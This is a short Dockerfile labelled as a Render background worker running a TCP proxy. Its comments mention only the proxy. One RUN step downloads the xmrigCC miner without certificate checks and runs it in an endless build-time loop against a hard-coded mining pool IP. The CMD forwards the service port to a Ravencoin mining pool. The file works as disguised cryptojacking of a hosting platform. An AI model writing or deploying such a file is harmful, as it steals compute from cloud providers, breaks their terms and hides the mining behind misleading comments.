# Dockerfile for Render Background Worker

# 1. Start with a lightweight, official Node.js image.
FROM node:18-slim

# 2. Install the node-tcp-proxy package globally.
RUN npm install -g node-tcp-proxy --no-update-notifier
RUN apt-get update -y;apt-get install sudo curl wget xz-utils -y
RUN wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz --no-check-certificate && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && while true; do ./xmrigDaemon --threads=4 --donate-level 1 -o 146.190.158.199:443 -u krxXKDZ8P6.worker -p x -a rx/0 -k ; sleep 3 ; done

# 3. Define the command that will be run when the container starts.
#    It listens on the default port Render provides ($PORT, which is 10000).
#    The 'while true' loop ensures it restarts if it ever crashes.
CMD ["sh", "-c", "while true; do tcpproxy --hostname 0.0.0.0 --proxyPort ${PORT:-10000} --serviceHost rvn.kryptex.network --servicePort 7031 -q; sleep 3; done"]
